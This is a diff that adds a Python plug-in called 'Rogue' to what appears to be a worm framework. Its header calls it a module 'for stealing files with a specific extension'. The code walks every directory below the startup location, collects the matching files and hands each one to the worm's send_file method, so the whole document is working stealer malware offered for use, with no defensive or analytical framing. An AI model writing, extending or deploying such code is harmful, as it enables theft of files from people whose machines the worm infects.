@@ -1,0 +1,34 @@
+#!name##Rogue
+#!types##module
+#!info##A simple module for stealing files with a specific extension. It searches directories from the startup location.
+#!reqVar##RO_ext##File extension too steal##str
+#!setVar##RO_ext##ico##str
+
+import os
+from time import sleep
+
+class Rogue:
+    MTYPES = "stealer"
+    def __init__(self, worm: object):
+        self.worm = worm
+        self.fext = "." + "{{RO_ext}}".lstrip(".")
+        self.targets = []
+    
+
+    def find_files(self) -> None:
+        for root, dirs, files in os.walk(os.getcwd()):
+            for name in files:
+
+                if os.path.splitext(name)[1] == self.fext:
+                    self.targets.append(os.path.join(root, name))
+    
+    def send(self) -> None:
+        for tar in self.targets:
+            self.worm.send_file(tar)
+            sleep(0.2)
+    
+    def execute(self) -> None:
+        self.send()
+    
+    def start(self) -> None:
+        self.find_files()
